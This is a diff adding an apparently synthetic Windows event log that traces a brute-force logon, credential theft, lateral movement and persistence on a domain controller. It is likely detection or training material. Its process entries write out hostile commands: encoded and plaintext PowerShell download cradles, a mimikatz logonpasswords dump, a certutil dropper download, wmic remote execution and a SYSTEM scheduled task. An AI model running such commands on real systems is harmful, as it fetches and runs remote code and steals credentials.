@@ -1,0 +1,250 @@
+EventID=4625
+Date/Time=2024-03-15T02:11:03Z
+Account Name=administrator
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+Failure Reason=Unknown user name or bad password
+Workstation Name=EXTERNAL
+
+EventID=4625
+Date/Time=2024-03-15T02:11:07Z
+Account Name=administrator
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+Failure Reason=Unknown user name or bad password
+Workstation Name=EXTERNAL
+
+EventID=4625
+Date/Time=2024-03-15T02:11:11Z
+Account Name=admin
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+Failure Reason=Unknown user name or bad password
+Workstation Name=EXTERNAL
+
+EventID=4625
+Date/Time=2024-03-15T02:11:15Z
+Account Name=admin
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+Failure Reason=Unknown user name or bad password
+Workstation Name=EXTERNAL
+
+EventID=4625
+Date/Time=2024-03-15T02:11:19Z
+Account Name=jsmith
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+Failure Reason=Unknown user name or bad password
+Workstation Name=EXTERNAL
+
+EventID=4625
+Date/Time=2024-03-15T02:11:23Z
+Account Name=jsmith
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+Failure Reason=Unknown user name or bad password
+Workstation Name=EXTERNAL
+
+EventID=4625
+Date/Time=2024-03-15T02:11:27Z
+Account Name=svc_backup
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+Failure Reason=Unknown user name or bad password
+Workstation Name=EXTERNAL
+
+EventID=4625
+Date/Time=2024-03-15T02:11:31Z
+Account Name=administrator
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+Failure Reason=Unknown user name or bad password
+Workstation Name=EXTERNAL
+
+EventID=4625
+Date/Time=2024-03-15T02:11:35Z
+Account Name=administrator
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+Failure Reason=Unknown user name or bad password
+Workstation Name=EXTERNAL
+
+EventID=4625
+Date/Time=2024-03-15T02:11:39Z
+Account Name=administrator
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+Failure Reason=Unknown user name or bad password
+Workstation Name=EXTERNAL
+
+EventID=4624
+Date/Time=2024-03-15T02:14:52Z
+Account Name=administrator
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+Workstation Name=DC-01
+
+EventID=4672
+Date/Time=2024-03-15T02:14:53Z
+Account Name=administrator
+Account Domain=CORP
+Workstation Name=DC-01
+
+EventID=4688
+Date/Time=2024-03-15T02:15:10Z
+Account Name=administrator
+Account Domain=CORP
+New Process Name=C:\Windows\System32\cmd.exe
+New Process ID=0x0a10
+Creator Process Name=C:\Windows\System32\services.exe
+Workstation Name=DC-01
+
+EventID=4688
+Date/Time=2024-03-15T02:15:22Z
+Account Name=administrator
+Account Domain=CORP
+New Process Name=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA5ADkALwBwAGEAeQBsAG8AYQBkACcAKQA=
+New Process ID=0x0b44
+Creator Process Name=C:\Windows\System32\cmd.exe
+Workstation Name=DC-01
+
+EventID=4688
+Date/Time=2024-03-15T02:15:45Z
+Account Name=administrator
+Account Domain=CORP
+New Process Name=C:\Windows\Temp\mimikatz.exe privilege::debug sekurlsa::logonpasswords
+New Process ID=0x0c88
+Creator Process Name=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Workstation Name=DC-01
+
+EventID=4688
+Date/Time=2024-03-15T02:16:01Z
+Account Name=administrator
+Account Domain=CORP
+New Process Name=C:\Windows\System32\net.exe user /domain
+New Process ID=0x0d10
+Creator Process Name=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Workstation Name=DC-01
+
+EventID=4776
+Date/Time=2024-03-15T02:16:30Z
+Account Name=jsmith
+Account Domain=CORP
+Source Network Address=203.0.113.45
+Logon Type=3
+
+EventID=4648
+Date/Time=2024-03-15T02:17:05Z
+Account Name=administrator
+Account Domain=CORP
+Source Network Address=192.168.10.5
+Logon Type=3
+Workstation Name=WS-001
+
+EventID=4624
+Date/Time=2024-03-15T02:18:10Z
+Account Name=administrator
+Account Domain=CORP
+Source Network Address=192.168.10.5
+Logon Type=10
+Workstation Name=WS-001
+
+EventID=4688
+Date/Time=2024-03-15T02:18:35Z
+Account Name=administrator
+Account Domain=CORP
+New Process Name=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.99/stage2')"
+New Process ID=0x1100
+Creator Process Name=C:\Windows\System32\cmd.exe
+Workstation Name=WS-001
+
+EventID=4624
+Date/Time=2024-03-15T02:21:44Z
+Account Name=administrator
+Account Domain=CORP
+Source Network Address=192.168.10.5
+Logon Type=10
+Workstation Name=WS-002
+
+EventID=4688
+Date/Time=2024-03-15T02:22:03Z
+Account Name=administrator
+Account Domain=CORP
+New Process Name=C:\Windows\System32\wmic.exe /node:WS-003 process call create "cmd.exe /c whoami"
+New Process ID=0x1250
+Creator Process Name=C:\Windows\System32\cmd.exe
+Workstation Name=WS-002
+
+EventID=4624
+Date/Time=2024-03-15T02:24:19Z
+Account Name=jsmith
+Account Domain=CORP
+Source Network Address=192.168.10.5
+Logon Type=10
+Workstation Name=WS-003
+
+EventID=4688
+Date/Time=2024-03-15T02:24:50Z
+Account Name=jsmith
+Account Domain=CORP
+New Process Name=C:\Windows\System32\certutil.exe -urlcache -split -f http://203.0.113.45/dropper.exe C:\Users\Public\svchost32.exe
+New Process ID=0x1380
+Creator Process Name=C:\Windows\System32\cmd.exe
+Workstation Name=WS-003
+
+EventID=4698
+Date/Time=2024-03-15T02:26:00Z
+Account Name=administrator
+Account Domain=CORP
+Task Name=\Microsoft\Windows\Maintenance\WinTelemetryUpdate
+Workstation Name=DC-01
+
+EventID=7045
+Date/Time=2024-03-15T02:26:45Z
+Account Name=administrator
+Account Domain=CORP
+Service Name=WinUpdateSvc
+Workstation Name=DC-01
+
+EventID=4720
+Date/Time=2024-03-15T02:27:30Z
+Account Name=administrator
+Account Domain=CORP
+New Account Name=svc_monitor
+New Account Domain=CORP
+Workstation Name=DC-01
+
+EventID=4732
+Date/Time=2024-03-15T02:27:35Z
+Account Name=administrator
+Account Domain=CORP
+Member Name=svc_monitor
+Group Name=Administrators
+Workstation Name=DC-01
+
+EventID=4688
+Date/Time=2024-03-15T02:28:10Z
+Account Name=svc_monitor
+Account Domain=CORP
+New Process Name=C:\Windows\System32\schtasks.exe /create /sc onlogon /tn Updater /tr "C:\Users\Public\svchost32.exe" /ru SYSTEM
+New Process ID=0x1500
+Creator Process Name=C:\Windows\System32\cmd.exe
+Workstation Name=DC-01
+
+EventID=4634
+Date/Time=2024-03-15T02:30:00Z
+Account Name=administrator
+Account Domain=CORP
+Workstation Name=DC-01
